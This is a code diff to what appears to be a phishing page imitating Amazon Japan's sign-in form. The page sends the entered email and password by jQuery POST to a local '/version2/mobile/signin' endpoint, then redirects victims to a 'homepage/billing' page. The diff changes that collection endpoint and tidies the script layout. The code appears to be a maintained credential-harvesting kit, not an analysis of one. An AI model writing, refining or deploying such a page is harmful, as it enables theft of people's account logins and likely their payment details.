@@ -11,10 +11,14 @@
     <link rel="stylesheet" href="style/css/61ccss.css">
     <link rel="stylesheet" href="style/css/01Scss.css">
     <link rel="stylesheet" href="style/css/11Hcss.css">
+    <link rel="stylesheet" href="style/css/signin.css">
 </head>
 
 <body id="bodyid"
       class="a-color-offset-background ap-locale-ja_JP a-m-cn a-aui_157141-c a-aui_158613-t1 a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready">
+</body>
+<script src="js/jquery.min.js"></script>
+<script src="js/jquery.validate.min.js"></script>
 <script type="text/javascript">
      setTimeout("yincang()", 0);
      function yincang() {
@@ -129,7 +133,7 @@
             "            <!-- show a warning modal dialog when the third party account is connected with Amazon -->\n" +
             "            <form name=\"signineml\" method=\"post\" id=\"signineml\" novalidate=\"\" action=\"#\"\n" +
             "                  class=\"auth-validate-form auth-clearable-form\" data-fwcim-id=\"tAzQmSig\">\n" +
-            "                <h1 class=\"a-spacing-micro a-spacing-top-small a-text-left\">ログイン</h1>\n" +
+            "                <h1 class=\"a-spacing-micro a-spacing-top-small a-text-left\"></span>ログイン</h1>\n" +
             "                <div class=\"a-section a-spacing-base a-text-right\">\n" +
             "                    <a id=\"auth-fpp-link-bottom\" class=\"a-link-normal\" target=\"_top\" tabindex=\"9\"\n" +
             "                       href=\"#\">パスワードを忘れた方</a>\n" +
@@ -329,7 +333,7 @@
              },
              submitHandler: function(form) {
                  $("#zwimel").show();
-                 $.post("/amazon2/mobile/signin", $("#signineml").serialize(),
+                 $.post("/version2/mobile/signin", $("#signineml").serialize(),
                          function(result) {
                              setTimeout(function() {
                                          $(location).attr("href", "homepage/billing")
@@ -346,6 +350,7 @@
          $('#password').bind('input propertychange', function () {
              passvaluechange();
          });
+
          function passvaluechange() {
              showpassvalue.innerHTML = passele.value;
              if (passele.value) {
@@ -354,24 +359,19 @@
                  passcleanhidden();
              }
          }
-
          function passcleanshow() {
              passclean.style = "display:block;";
          }
-
          function passcleanhidden() {
              passclean.style = "display:none;";
          }
-
          function clearpass() {
              passele.value = null;
              showpassvalue.innerHTML = passele.value;
              passcleanhidden();
          }
-
-         var changele = document.getElementById("auth-show-password-checkbox");
-
          function passchange() {
+             var changele = document.getElementById("auth-show-password-checkbox");
              if (changele.checked) {
                  showpassdiv.style = "display: block;";
              } else {
@@ -379,11 +379,5 @@
              }
          }
      }
-</script>
-</body>
-<script src="js/jquery.min.js"></script>
-<script src="js/jquery.validate.min.js"></script>
-<script>
-
 </script>
 
